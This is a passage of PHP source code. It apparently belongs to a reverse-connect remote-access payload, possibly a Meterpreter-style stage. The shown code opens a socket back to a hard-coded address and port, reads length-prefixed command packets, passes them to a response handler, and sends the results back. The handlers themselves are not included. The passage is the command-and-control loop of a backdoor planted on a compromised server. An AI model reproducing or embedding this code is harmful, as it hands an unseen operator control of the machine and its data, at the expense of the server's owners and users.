	$ipaddr = '127.0.0.1';
	$msgsock=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
	$res = socket_connect($msgsock,$ipaddr,$port);
	log($res);
	if (!$res) {
		die();
	}
}

$socket_readers = array($msgsock);
$file_readers = array();

#
# Main dispatch loop
#
while (FALSE !== socket_select($r=$socket_readers, $w=NULL, $e=NULL, 1)) {
    foreach ($r as $ready) {
        if ($ready == $msgsock) {
            $request = socket_read($msgsock, 8, PHP_BINARY_READ);
            if (FALSE==$request) { 
                break; 
            }
            $a = unpack("Nlen/Ntype", $request);
            # length of the whole packet, including header
            $len = $a['len'];
            # packet type should always be 0, i.e. PACKET_TYPE_REQUEST
            $ptype = $a['type'];
            while (strlen($request) < $a['len']) {
                $request .= socket_read($msgsock, $len-strlen($request), PHP_BINARY_READ);
            }
            hexdump(substr($request, 0, $len));
			my_print("creating response");
            $response = create_response($request);

            socket_write($msgsock, $response);
        } else {
            my_print("not Msgsock\n");
            $data = socket_read($msgsock, 8, PHP_BINARY_READ);
            if (FALSE == $data) {

            }
        }
    }
    #if (0 < count($file_readers)) {
    #    stream_select($r=$file_readers, $w=NULL, $e=NULL, 0);
    #    foreach ($r as $ready) {
    #        $read = fread($r, 
    #    }
    #}
}
socket_close($msgsock);

